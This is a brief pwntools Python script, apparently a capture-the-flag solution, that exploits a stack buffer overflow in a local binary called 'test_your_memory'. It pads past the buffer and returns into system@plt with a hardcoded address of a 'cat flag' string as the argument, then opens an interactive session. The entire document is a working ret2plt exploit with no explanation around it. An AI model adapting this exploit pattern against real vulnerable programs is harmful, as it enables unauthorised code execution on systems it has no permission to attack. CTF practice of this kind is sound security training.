from pwn import *
p = process("./test_your_memory")
elf = ELF("./test_your_memory")
system_addr = elf.plt["system"]
cat_flag = 0x080487E0
#gdb.attach(p,"b *0x0804863D")
context.log_level = "debug"
payload = 0x13*"a" + "junk" + p32(system_addr) + p32(cat_flag) + p32(cat_flag)
p.sendlineafter("> ",payload)
p.interactive()
